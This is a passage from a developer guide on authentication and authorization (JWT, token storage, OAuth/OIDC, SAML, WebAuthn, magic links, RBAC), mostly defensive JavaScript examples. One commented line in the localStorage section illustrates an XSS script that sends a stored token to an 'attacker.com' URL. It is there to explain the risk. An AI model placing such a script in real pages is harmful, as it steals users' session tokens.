      hashed.push(hash);
    }
    return hashed;
  }

  // Generate and store backup codes
  static async createBackupCodes(userId) {
    const codes = this.generateBackupCodes();
    const hashedCodes = await this.hashCodes(codes);

    await db.users.update(
      { id: userId },
      { backupCodes: hashedCodes }
    );

    return codes; // Return plain codes to show user once
  }

  // Use backup code
  static async useBackupCode(userId, code) {
    const user = await db.users.findById(userId);
    const hash = crypto.createHash('sha256').update(code).digest('hex');

    const index = user.backupCodes.indexOf(hash);
    if (index === -1) {
      return false;
    }

    // Remove used code
    user.backupCodes.splice(index, 1);
    await db.users.update(
      { id: userId },
      { backupCodes: user.backupCodes }
    );

    return true;
  }
}
</code></pre>
<hr>
<h2 id="token-based-authentication"><a class="header" href="#token-based-authentication">Token-Based Authentication</a></h2>
<h3 id="jwt-authentication"><a class="header" href="#jwt-authentication">JWT Authentication</a></h3>
<pre><code class="language-javascript">const jwt = require('jsonwebtoken');

class JWTAuthService {
  // Generate access token
  static generateAccessToken(user) {
    return jwt.sign(
      {
        userId: user.id,
        username: user.username,
        roles: user.roles
      },
      process.env.JWT_SECRET,
      {
        expiresIn: '15m',
        issuer: 'myapp.com',
        audience: 'myapp-api'
      }
    );
  }

  // Generate refresh token
  static generateRefreshToken(user) {
    return jwt.sign(
      { userId: user.id },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );
  }

  // Verify access token
  static verifyAccessToken(token) {
    try {
      return jwt.verify(token, process.env.JWT_SECRET, {
        issuer: 'myapp.com',
        audience: 'myapp-api'
      });
    } catch (error) {
      throw new Error('Invalid or expired token');
    }
  }

  // Refresh access token
  static async refreshAccessToken(refreshToken) {
    try {
      const payload = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);

      // Check if refresh token is revoked
      const isRevoked = await redis.get(`revoked:${refreshToken}`);
      if (isRevoked) {
        throw new Error('Token revoked');
      }

      const user = await db.users.findById(payload.userId);
      if (!user) {
        throw new Error('User not found');
      }

      return this.generateAccessToken(user);
    } catch (error) {
      throw new Error('Invalid refresh token');
    }
  }
}

// Authentication middleware
function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.substring(7);

  try {
    const payload = JWTAuthService.verifyAccessToken(token);
    req.user = payload;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Login endpoint
app.post('/auth/login', async (req, res) =&gt; {
  const { username, password } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const accessToken = JWTAuthService.generateAccessToken(user);
  const refreshToken = JWTAuthService.generateRefreshToken(user);

  // Store refresh token
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  res.json({ accessToken, refreshToken });
});

// Refresh endpoint
app.post('/auth/refresh', async (req, res) =&gt; {
  const { refreshToken } = req.body;

  try {
    const accessToken = await JWTAuthService.refreshAccessToken(refreshToken);
    res.json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: error.message });
  }
});
</code></pre>
<h3 id="token-storage-strategies"><a class="header" href="#token-storage-strategies">Token Storage Strategies</a></h3>
<p><strong>Comparison of Storage Options:</strong></p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Storage</th><th>Security</th><th>XSS Risk</th><th>CSRF Risk</th><th>Accessibility</th><th>Best For</th></tr>
</thead>
<tbody>
<tr><td><strong>httpOnly Cookie</strong></td><td>⭐⭐⭐⭐⭐</td><td>Protected</td><td>Vulnerable*</td><td>Server only</td><td>Web apps</td></tr>
<tr><td><strong>Regular Cookie</strong></td><td>⭐⭐</td><td>Vulnerable</td><td>Vulnerable*</td><td>Client &amp; Server</td><td>Legacy</td></tr>
<tr><td><strong>localStorage</strong></td><td>⭐⭐</td><td>Vulnerable</td><td>Protected</td><td>Client only</td><td>Never recommended</td></tr>
<tr><td><strong>sessionStorage</strong></td><td>⭐⭐</td><td>Vulnerable</td><td>Protected</td><td>Client only</td><td>Never recommended</td></tr>
<tr><td><strong>Memory (React state)</strong></td><td>⭐⭐⭐⭐</td><td>Vulnerable</td><td>Protected</td><td>Client only</td><td>SPAs</td></tr>
</tbody>
</table>
</div>
<p>*CSRF risk mitigated with SameSite attribute or CSRF tokens</p>
<p><strong>1. httpOnly Cookies (Recommended for Web Apps)</strong></p>
<pre><code class="language-javascript">// Server-side: Set token in httpOnly cookie
app.post('/auth/login', async (req, res) =&gt; {
  const user = await authenticateUser(req.body);
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Access token in httpOnly cookie
  res.cookie('accessToken', accessToken, {
    httpOnly: true,    // Cannot be accessed by JavaScript
    secure: true,      // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 15 * 60 * 1000 // 15 minutes
  });

  // Refresh token in separate httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh', // Only sent to refresh endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });

  res.json({ success: true });
});

// Client-side: Cookies sent automatically
fetch('/api/data', {
  method: 'GET',
  credentials: 'include' // Important: include cookies
});
</code></pre>
<p><strong>2. localStorage (NOT Recommended)</strong></p>
<pre><code class="language-javascript">// ❌ Vulnerable to XSS attacks
localStorage.setItem('token', accessToken);

// Any script can read it
const token = localStorage.getItem('token');

// XSS attack example:
// &lt;script&gt;
//   const token = localStorage.getItem('token');
//   fetch('https://attacker.com/steal?token=' + token);
// &lt;/script&gt;
</code></pre>
<p><strong>3. Memory Storage (Good for SPAs)</strong></p>
<pre><code class="language-javascript">// React example - store in state/context
const AuthContext = React.createContext();

function AuthProvider({ children }) {
  const [token, setToken] = useState(null);

  const login = async (credentials) =&gt; {
    const response = await fetch('/auth/login', {
      method: 'POST',
      body: JSON.stringify(credentials)
    });

    const { accessToken } = await response.json();
    setToken(accessToken);
  };

  const logout = () =&gt; {
    setToken(null);
  };

  return (
    &lt;AuthContext.Provider value={{ token, login, logout }}&gt;
      {children}
    &lt;/AuthContext.Provider&gt;
  );
}

// API calls with token
const useAPI = () =&gt; {
  const { token } = useContext(AuthContext);

  const fetchData = async () =&gt; {
    const response = await fetch('/api/data', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
    return await response.json();
  };

  return { fetchData };
};

// Limitation: Token lost on page refresh
// Solution: Use refresh token in httpOnly cookie
</code></pre>
<p><strong>4. Hybrid Approach (Best for SPAs)</strong></p>
<pre><code class="language-javascript">// Combine memory storage + httpOnly refresh token
class TokenManager {
  constructor() {
    this.accessToken = null;
  }

  // Store access token in memory
  setAccessToken(token) {
    this.accessToken = token;
  }

  getAccessToken() {
    return this.accessToken;
  }

  // Refresh token stored in httpOnly cookie on server
  async refreshAccessToken() {
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Send httpOnly cookie
    });

    const { accessToken } = await response.json();
    this.setAccessToken(accessToken);
    return accessToken;
  }

  // Auto-refresh before expiration
  scheduleRefresh(expiresIn) {
    const refreshTime = (expiresIn - 60) * 1000; // Refresh 1 min before expiry
    setTimeout(() =&gt; {
      this.refreshAccessToken();
    }, refreshTime);
  }
}

// Usage
const tokenManager = new TokenManager();

// Login
const { accessToken, expiresIn } = await login(credentials);
tokenManager.setAccessToken(accessToken);
tokenManager.scheduleRefresh(expiresIn);

// API calls
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${tokenManager.getAccessToken()}`
  }
});
</code></pre>
<p><strong>5. Token Rotation</strong></p>
<pre><code class="language-javascript">// Server-side token rotation
class TokenRotationService {
  static async rotateRefreshToken(oldRefreshToken) {
    // Verify old token
    const payload = jwt.verify(oldRefreshToken, process.env.JWT_REFRESH_SECRET);

    // Check if token is revoked or reused
    const tokenInfo = await db.refreshTokens.findOne({
      token: hashToken(oldRefreshToken)
    });

    if (!tokenInfo) {
      // Token reuse detected - possible attack
      await this.revokeAllUserTokens(payload.userId);
      throw new Error('Token reuse detected');
    }

    // Mark old token as used
    await db.refreshTokens.update(
      { token: hashToken(oldRefreshToken) },
      { used: true, usedAt: new Date() }
    );

    // Generate new tokens
    const user = await db.users.findById(payload.userId);
    const newAccessToken = generateAccessToken(user);
    const newRefreshToken = generateRefreshToken(user);

    // Store new refresh token
    await db.refreshTokens.create({
      userId: user.id,
      token: hashToken(newRefreshToken),
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
  }

  static async revokeAllUserTokens(userId) {
    await db.refreshTokens.deleteMany({ userId });
  }
}
</code></pre>
<p><strong>Security Recommendations:</strong></p>
<pre><code class="language-javascript">// ✅ Best Practices
const TOKEN_STORAGE_BEST_PRACTICES = {
  webApps: 'httpOnly cookies with SameSite=strict',
  spas: 'Memory (state) + httpOnly refresh token',
  mobileApps: 'Secure storage (Keychain/Keystore)',

  avoid: [
    'localStorage for tokens',
    'sessionStorage for tokens',
    'Regular cookies for tokens',
    'URL parameters for tokens'
  ],

  additional: [
    'Use short-lived access tokens (15 min)',
    'Implement token rotation',
    'Monitor for token reuse',
    'Revoke tokens on logout',
    'Use HTTPS always',
    'Implement CSRF protection for cookies'
  ]
};
</code></pre>
<hr>
<h3 id="api-key-authentication"><a class="header" href="#api-key-authentication">API Key Authentication</a></h3>
<pre><code class="language-javascript">class APIKeyService {
  // Generate API key
  static generateAPIKey() {
    const prefix = 'sk';
    const key = crypto.randomBytes(32).toString('hex');
    return `${prefix}_${key}`;
  }

  // Hash API key for storage
  static hashAPIKey(apiKey) {
    return crypto.createHash('sha256').update(apiKey).digest('hex');
  }

  // Create API key
  static async createAPIKey(userId, name, permissions = []) {
    const apiKey = this.generateAPIKey();
    const hash = this.hashAPIKey(apiKey);

    await db.apiKeys.create({
      userId,
      name,
      hash,
      permissions,
      createdAt: new Date(),
      lastUsed: null
    });

    return apiKey; // Return plain key only once
  }

  // Verify API key
  static async verifyAPIKey(apiKey) {
    const hash = this.hashAPIKey(apiKey);
    const key = await db.apiKeys.findOne({ hash });

    if (!key) {
      throw new Error('Invalid API key');
    }

    // Update last used
    await db.apiKeys.update(
      { id: key.id },
      { lastUsed: new Date() }
    );

    return {
      userId: key.userId,
      permissions: key.permissions
    };
  }

  // Revoke API key
  static async revokeAPIKey(keyId) {
    await db.apiKeys.delete({ id: keyId });
  }
}

// API key middleware
async function authenticateAPIKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];

  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }

  try {
    const keyInfo = await APIKeyService.verifyAPIKey(apiKey);
    req.apiKey = keyInfo;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
}
</code></pre>
<hr>
<h2 id="oauth-20-and-openid-connect"><a class="header" href="#oauth-20-and-openid-connect">OAuth 2.0 and OpenID Connect</a></h2>
<h3 id="oauth-20-overview"><a class="header" href="#oauth-20-overview">OAuth 2.0 Overview</a></h3>
<p>OAuth 2.0 is an <strong>authorization</strong> framework that enables applications to obtain limited access to user accounts. It delegates user authentication to the service hosting the account and authorizes third-party applications.</p>
<p><strong>Key OAuth 2.0 Flows:</strong></p>
<pre><code class="language-javascript">// 1. Authorization Code Flow (most secure, for server-side apps)
const authUrl = `${AUTHORIZATION_URL}?response_type=code&amp;client_id=${CLIENT_ID}&amp;redirect_uri=${REDIRECT_URI}&amp;scope=read write&amp;state=${STATE}`;

// 2. Client Credentials Flow (for machine-to-machine)
const tokenResponse = await fetch(TOKEN_URL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET
  })
});

// 3. PKCE (Proof Key for Code Exchange) - for mobile/SPA
const codeVerifier = generateCodeVerifier();
const codeChallenge = generateCodeChallenge(codeVerifier);

const authUrl = `${AUTHORIZATION_URL}?response_type=code&amp;client_id=${CLIENT_ID}&amp;code_challenge=${codeChallenge}&amp;code_challenge_method=S256`;
</code></pre>
<p><strong>Grant Types Comparison:</strong></p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Grant Type</th><th>Use Case</th><th>Client Type</th><th>Security</th></tr>
</thead>
<tbody>
<tr><td><strong>Authorization Code</strong></td><td>Web apps</td><td>Confidential</td><td>⭐⭐⭐⭐⭐</td></tr>
<tr><td><strong>Authorization Code + PKCE</strong></td><td>Mobile, SPA</td><td>Public</td><td>⭐⭐⭐⭐⭐</td></tr>
<tr><td><strong>Client Credentials</strong></td><td>Service-to-service</td><td>Confidential</td><td>⭐⭐⭐⭐</td></tr>
<tr><td><strong>Implicit</strong> (deprecated)</td><td>SPA</td><td>Public</td><td>⭐⭐</td></tr>
<tr><td><strong>Password</strong> (deprecated)</td><td>Legacy</td><td>Any</td><td>⭐</td></tr>
</tbody>
</table>
</div>
<p><strong>Token Types:</strong></p>
<pre><code class="language-javascript">// Access Token - short-lived, used to access resources
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600  // 1 hour
}

// Refresh Token - long-lived, used to obtain new access tokens
{
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "expires_in": 604800  // 7 days
}
</code></pre>
<p><strong>For detailed OAuth 2.0 implementation examples, see <a href="oauth2.html">oauth2.md</a></strong></p>
<h3 id="openid-connect-oidc"><a class="header" href="#openid-connect-oidc">OpenID Connect (OIDC)</a></h3>
<p>OpenID Connect is an <strong>authentication</strong> layer built on top of OAuth 2.0. It adds identity verification capabilities to OAuth.</p>
<p><strong>Key Differences from OAuth 2.0:</strong></p>
<pre><code>OAuth 2.0:  Authorization - "What can you access?"
OIDC:       Authentication + Authorization - "Who are you?" + "What can you access?"
</code></pre>
<p><strong>OIDC Tokens:</strong></p>
<pre><code class="language-javascript">// ID Token - contains user identity information
{
  "iss": "https://accounts.example.com",
  "sub": "248289761001",
  "aud": "your-client-id",
  "exp": 1516239022,
  "iat": 1516239022,
  "name": "Alice Smith",
  "email": "alice@example.com",
  "email_verified": true
}

// Access Token - same as OAuth 2.0

// Refresh Token - same as OAuth 2.0
</code></pre>
<p><strong>OIDC Implementation:</strong></p>
<pre><code class="language-javascript">const { Issuer, generators } = require('openid-client');

class OIDCAuth {
  static async initialize() {
    // Discover OIDC configuration
    const issuer = await Issuer.discover('https://accounts.google.com');

    this.client = new issuer.Client({
      client_id: process.env.OIDC_CLIENT_ID,
      client_secret: process.env.OIDC_CLIENT_SECRET,
      redirect_uris: ['https://myapp.com/callback'],
      response_types: ['code']
    });
  }

  // Initiate login
  static getAuthUrl() {
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    const state = generators.state();

    const authUrl = this.client.authorizationUrl({
      scope: 'openid email profile',
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state
    });

    return { authUrl, codeVerifier, state };
  }

  // Handle callback
  static async handleCallback(callbackParams, codeVerifier, state) {
    // Exchange code for tokens
    const tokenSet = await this.client.callback(
      'https://myapp.com/callback',
      callbackParams,
      { code_verifier: codeVerifier, state }
    );

    // Verify ID token
    const claims = tokenSet.claims();

    // Get additional user info
    const userInfo = await this.client.userinfo(tokenSet.access_token);

    return {
      userId: claims.sub,
      email: claims.email,
      name: claims.name,
      tokens: tokenSet
    };
  }

  // Verify ID token
  static async verifyIdToken(idToken) {
    const tokenSet = await this.client.validateIdToken(idToken);
    return tokenSet.claims();
  }
}
</code></pre>
<p><strong>OIDC Scopes:</strong></p>
<pre><code class="language-javascript">// Standard OIDC scopes
const scopes = {
  openid: 'Required - indicates OIDC request',
  profile: 'Access to profile info (name, picture, etc.)',
  email: 'Access to email and email_verified',
  address: 'Access to address info',
  phone: 'Access to phone number'
};

// Usage
const authUrl = client.authorizationUrl({
  scope: 'openid email profile'
});
</code></pre>
<p><strong>UserInfo Endpoint:</strong></p>
<pre><code class="language-javascript">// Fetch additional user information
async function getUserInfo(accessToken) {
  const response = await fetch('https://accounts.example.com/userinfo', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

  return await response.json();
  // {
  //   "sub": "248289761001",
  //   "name": "Alice Smith",
  //   "email": "alice@example.com",
  //   "picture": "https://example.com/photo.jpg"
  // }
}
</code></pre>
<hr>
<h2 id="single-sign-on-sso"><a class="header" href="#single-sign-on-sso">Single Sign-On (SSO)</a></h2>
<h3 id="saml-20"><a class="header" href="#saml-20">SAML 2.0</a></h3>
<pre><code class="language-javascript">const saml2 = require('saml2-js');

class SAMLService {
  constructor() {
    // Service Provider configuration
    this.sp = new saml2.ServiceProvider({
      entity_id: "https://myapp.com/saml/metadata",
      private_key: fs.readFileSync("sp-key.pem").toString(),
      certificate: fs.readFileSync("sp-cert.pem").toString(),
      assert_endpoint: "https://myapp.com/saml/assert",
      allow_unencrypted_assertion: false
    });

    // Identity Provider configuration
    this.idp = new saml2.IdentityProvider({
      sso_login_url: "https://idp.example.com/saml/login",
      sso_logout_url: "https://idp.example.com/saml/logout",
      certificates: [fs.readFileSync("idp-cert.pem").toString()]
    });
  }

  // Initiate SAML login
  getLoginUrl(req, res) {
    this.sp.create_login_request_url(this.idp, {}, (err, loginUrl) =&gt; {
      if (err) {
        return res.status(500).send(err);
      }
      res.redirect(loginUrl);
    });
  }

  // Handle SAML assertion
  async assertSAML(req, res) {
    const options = { request_body: req.body };

    this.sp.post_assert(this.idp, options, async (err, samlResponse) =&gt; {
      if (err) {
        return res.status(500).send(err);
      }

      const user = samlResponse.user;

      // Find or create user
      let dbUser = await db.users.findOne({ email: user.email });
      if (!dbUser) {
        dbUser = await db.users.create({
          email: user.email,
          name: user.name,
          samlId: user.name_id
        });
      }

      // Create session
      req.session.userId = dbUser.id;
      res.redirect('/dashboard');
    });
  }
}
</code></pre>
<h3 id="openid-connect"><a class="header" href="#openid-connect">OpenID Connect</a></h3>
<pre><code class="language-javascript">const { Issuer, generators } = require('openid-client');

class OIDCService {
  static async initialize() {
    const issuer = await Issuer.discover('https://accounts.google.com');

    this.client = new issuer.Client({
      client_id: process.env.OIDC_CLIENT_ID,
      client_secret: process.env.OIDC_CLIENT_SECRET,
      redirect_uris: ['https://myapp.com/callback'],
      response_types: ['code']
    });
  }

  // Generate authorization URL
  static getAuthorizationUrl() {
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    const state = generators.state();

    const authUrl = this.client.authorizationUrl({
      scope: 'openid email profile',
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state
    });

    return { authUrl, codeVerifier, state };
  }

  // Handle callback
  static async handleCallback(req, codeVerifier) {
    const params = this.client.callbackParams(req);

    const tokenSet = await this.client.callback(
      'https://myapp.com/callback',
      params,
      { code_verifier: codeVerifier }
    );

    const userInfo = await this.client.userinfo(tokenSet.access_token);

    return {
      user: userInfo,
      tokens: tokenSet
    };
  }
}
</code></pre>
<hr>
<h2 id="biometric-authentication"><a class="header" href="#biometric-authentication">Biometric Authentication</a></h2>
<h3 id="webauthn-implementation"><a class="header" href="#webauthn-implementation">WebAuthn Implementation</a></h3>
<pre><code class="language-javascript">const {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse
} = require('@simplewebauthn/server');

class WebAuthnService {
  // Registration: Generate options
  static async generateRegistrationOptions(user) {
    const options = await generateRegistrationOptions({
      rpName: 'My App',
      rpID: 'myapp.com',
      userID: user.id,
      userName: user.username,
      userDisplayName: user.displayName,
      attestationType: 'none',
      authenticatorSelection: {
        residentKey: 'preferred',
        userVerification: 'preferred',
        authenticatorAttachment: 'platform', // or 'cross-platform'
      },
    });

    // Store challenge
    await redis.setex(
      `webauthn:${user.id}:challenge`,
      300, // 5 minutes
      options.challenge
    );

    return options;
  }

  // Registration: Verify response
  static async verifyRegistration(user, response) {
    const expectedChallenge = await redis.get(`webauthn:${user.id}:challenge`);

    const verification = await verifyRegistrationResponse({
      response,
      expectedChallenge,
      expectedOrigin: 'https://myapp.com',
      expectedRPID: 'myapp.com',
    });

    if (verification.verified) {
      // Store credential
      await db.credentials.create({
        userId: user.id,
        credentialID: verification.registrationInfo.credentialID,
        credentialPublicKey: verification.registrationInfo.credentialPublicKey,
        counter: verification.registrationInfo.counter,
      });
    }

    return verification.verified;
  }

  // Authentication: Generate options
  static async generateAuthenticationOptions(user) {
    const credentials = await db.credentials.find({ userId: user.id });

    const options = await generateAuthenticationOptions({
      rpID: 'myapp.com',
      allowCredentials: credentials.map(cred =&gt; ({
        id: cred.credentialID,
        type: 'public-key',
      })),
      userVerification: 'preferred',
    });

    await redis.setex(
      `webauthn:${user.id}:challenge`,
      300,
      options.challenge
    );

    return options;
  }

  // Authentication: Verify response
  static async verifyAuthentication(user, response) {
    const expectedChallenge = await redis.get(`webauthn:${user.id}:challenge`);
    const credential = await db.credentials.findOne({
      credentialID: response.id
    });

    const verification = await verifyAuthenticationResponse({
      response,
      expectedChallenge,
      expectedOrigin: 'https://myapp.com',
      expectedRPID: 'myapp.com',
      authenticator: {
        credentialPublicKey: credential.credentialPublicKey,
        credentialID: credential.credentialID,
        counter: credential.counter,
      },
    });

    if (verification.verified) {
      // Update counter
      await db.credentials.update(
        { id: credential.id },
        { counter: verification.authenticationInfo.newCounter }
      );
    }

    return verification.verified;
  }
}

// Client-side (browser)
/*
// Registration
const registrationOptions = await fetch('/webauthn/register/options').then(r =&gt; r.json());
const registrationResponse = await navigator.credentials.create({
  publicKey: registrationOptions
});
await fetch('/webauthn/register/verify', {
  method: 'POST',
  body: JSON.stringify(registrationResponse)
});

// Authentication
const authOptions = await fetch('/webauthn/auth/options').then(r =&gt; r.json());
const authResponse = await navigator.credentials.get({
  publicKey: authOptions
});
await fetch('/webauthn/auth/verify', {
  method: 'POST',
  body: JSON.stringify(authResponse)
});
*/
</code></pre>
<hr>
<h2 id="authentication-patterns"><a class="header" href="#authentication-patterns">Authentication Patterns</a></h2>
<h3 id="1-form-based-authentication"><a class="header" href="#1-form-based-authentication">1. Form-Based Authentication</a></h3>
<pre><code class="language-javascript">app.post('/login', async (req, res) =&gt; {
  const { username, password } = req.body;

  // Rate limiting
  const attempts = await redis.incr(`login:attempts:${username}`);
  if (attempts &gt; 5) {
    return res.status(429).json({
      error: 'Too many attempts. Try again later.'
    });
  }
  await redis.expire(`login:attempts:${username}`, 900); // 15 minutes

  // Verify credentials
  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Clear rate limit on success
  await redis.del(`login:attempts:${username}`);

  // Create session
  req.session.userId = user.id;
  res.json({ message: 'Login successful' });
});
</code></pre>
<h3 id="2-http-basic-authentication"><a class="header" href="#2-http-basic-authentication">2. HTTP Basic Authentication</a></h3>
<pre><code class="language-javascript">function basicAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="My App"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  const credentials = Buffer.from(
    authHeader.substring(6),
    'base64'
  ).toString('utf-8');

  const [username, password] = credentials.split(':');

  // Verify credentials
  const user = db.users.findOne({ username });
  if (!user || !verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  req.user = user;
  next();
}

// Usage
app.get('/api/data', basicAuth, (req, res) =&gt; {
  res.json({ data: 'protected' });
});
</code></pre>
<h3 id="3-certificate-based-authentication"><a class="header" href="#3-certificate-based-authentication">3. Certificate-Based Authentication</a></h3>
<pre><code class="language-javascript">const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('server-key.pem'),
  cert: fs.readFileSync('server-cert.pem'),
  ca: fs.readFileSync('ca-cert.pem'),
  requestCert: true,
  rejectUnauthorized: true
};

const server = https.createServer(options, (req, res) =&gt; {
  const cert = req.socket.getPeerCertificate();

  if (req.client.authorized) {
    const cn = cert.subject.CN;
    console.log(`Authenticated: ${cn}`);
    res.writeHead(200);
    res.end('Hello ' + cn);
  } else {
    res.writeHead(401);
    res.end('Unauthorized');
  }
});

server.listen(443);
</code></pre>
<h3 id="4-passwordless-authentication"><a class="header" href="#4-passwordless-authentication">4. Passwordless Authentication</a></h3>
<pre><code class="language-javascript">class PasswordlessAuthService {
  // Send magic link
  static async sendMagicLink(email) {
    const user = await db.users.findOne({ email });
    if (!user) {
      // Don't reveal if user exists
      return;
    }

    const token = crypto.randomBytes(32).toString('hex');
    const expires = Date.now() + 15 * 60 * 1000; // 15 minutes

    await redis.setex(
      `magic:${token}`,
      900,
      JSON.stringify({ userId: user.id, expires })
    );

    const magicLink = `https://myapp.com/auth/verify?token=${token}`;

    await emailService.send({
      to: email,
      subject: 'Your login link',
      html: `&lt;a href="${magicLink}"&gt;Click here to log in&lt;/a&gt;`
    });
  }

  // Verify magic link
  static async verifyMagicLink(token) {
    const data = await redis.get(`magic:${token}`);
    if (!data) {
      throw new Error('Invalid or expired link');
    }

    const { userId, expires } = JSON.parse(data);

    if (Date.now() &gt; expires) {
      await redis.del(`magic:${token}`);
      throw new Error('Link expired');
    }

    await redis.del(`magic:${token}`);
    return userId;
  }
}

// Endpoints
app.post('/auth/passwordless', async (req, res) =&gt; {
  const { email } = req.body;
  await PasswordlessAuthService.sendMagicLink(email);
  res.json({ message: 'Check your email for login link' });
});

app.get('/auth/verify', async (req, res) =&gt; {
  const { token } = req.query;

  try {
    const userId = await PasswordlessAuthService.verifyMagicLink(token);
    req.session.userId = userId;
    res.redirect('/dashboard');
  } catch (error) {
    res.status(400).send('Invalid or expired link');
  }
});
</code></pre>
<hr>
<h2 id="authorization"><a class="header" href="#authorization">Authorization</a></h2>
<p>Authorization determines what an authenticated user is allowed to do. After verifying identity (authentication), the system must decide what resources and actions the user can access.</p>
<h3 id="authorization-models-overview"><a class="header" href="#authorization-models-overview">Authorization Models Overview</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Model</th><th>Description</th><th>Best For</th><th>Complexity</th></tr>
</thead>
<tbody>
<tr><td><strong>RBAC</strong></td><td>Role-Based Access Control</td><td>Most applications</td><td>⭐⭐</td></tr>
<tr><td><strong>ABAC</strong></td><td>Attribute-Based Access Control</td><td>Complex policies</td><td>⭐⭐⭐⭐</td></tr>
<tr><td><strong>ACL</strong></td><td>Access Control Lists</td><td>Simple resources</td><td>⭐</td></tr>
<tr><td><strong>ReBAC</strong></td><td>Relationship-Based Access Control</td><td>Social apps</td><td>⭐⭐⭐</td></tr>
<tr><td><strong>PBAC</strong></td><td>Policy-Based Access Control</td><td>Enterprise</td><td>⭐⭐⭐⭐⭐</td></tr>
</tbody>
</table>
</div>
<h3 id="role-based-access-control-rbac"><a class="header" href="#role-based-access-control-rbac">Role-Based Access Control (RBAC)</a></h3>
<p>Users are assigned roles, and roles have permissions.</p>
<p><strong>Basic RBAC Implementation:</strong></p>
<pre><code class="language-javascript">// Define roles and permissions
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

// User model
const user = {
  id: 1,
  username: 'alice',
  roles: ['editor']
};

// Check permission
function hasPermission(user, permission) {
  return user.roles.some(role =&gt;
    roles[role]?.includes(permission)
  );
}

// Usage
if (hasPermission(user, 'write')) {
  // Allow write operation
}
</code></pre>
<p><strong>Database Schema for RBAC:</strong></p>
<pre><code class="language-sql">-- Users table
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(255) UNIQUE NOT NULL,
  email VARCHAR(255) UNIQUE NOT NULL
);

-- Roles table
CREATE TABLE roles (
  id SERIAL PRIMARY KEY,
  name VARCHAR(50) UNIQUE NOT NULL,
  description TEXT
);

-- Permissions table
CREATE TABLE permissions (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) UNIQUE NOT NULL,
  resource VARCHAR(100) NOT NULL,
  action VARCHAR(50) NOT NULL
);

-- User-Role assignment (many-to-many)
CREATE TABLE user_roles (
  user_id INT REFERENCES users(id) ON DELETE CASCADE,
  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
  PRIMARY KEY (user_id, role_id)
);

-- Role-Permission assignment (many-to-many)
CREATE TABLE role_permissions (
  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
  permission_id INT REFERENCES permissions(id) ON DELETE CASCADE,
  PRIMARY KEY (role_id, permission_id)
);
</code></pre>
<p><strong>Advanced RBAC with Hierarchical Roles:</strong></p>
<pre><code class="language-javascript">class RBACService {
  constructor() {
    // Role hierarchy
    this.roleHierarchy = {
      admin: ['editor', 'viewer'],
      editor: ['viewer'],
      viewer: []
    };

    // Permissions per role
    this.rolePermissions = {
      admin: ['users:*', 'posts:*', 'settings:*'],
      editor: ['posts:read', 'posts:write', 'posts:delete'],
      viewer: ['posts:read']
    };
  }

  // Get all inherited roles
  getInheritedRoles(role) {
    const inherited = [role];
    const children = this.roleHierarchy[role] || [];

    for (const childRole of children) {
      inherited.push(...this.getInheritedRoles(childRole));
    }

    return [...new Set(inherited)];
  }

  // Get all permissions for user
  getUserPermissions(user) {
    const allRoles = user.roles.flatMap(role =&gt;
      this.getInheritedRoles(role)
    );

    const permissions = allRoles.flatMap(role =&gt;
      this.rolePermissions[role] || []
    );

    return [...new Set(permissions)];
  }

  // Check if user has permission
  hasPermission(user, requiredPermission) {
    const userPermissions = this.getUserPermissions(user);

    return userPermissions.some(permission =&gt; {
      // Exact match
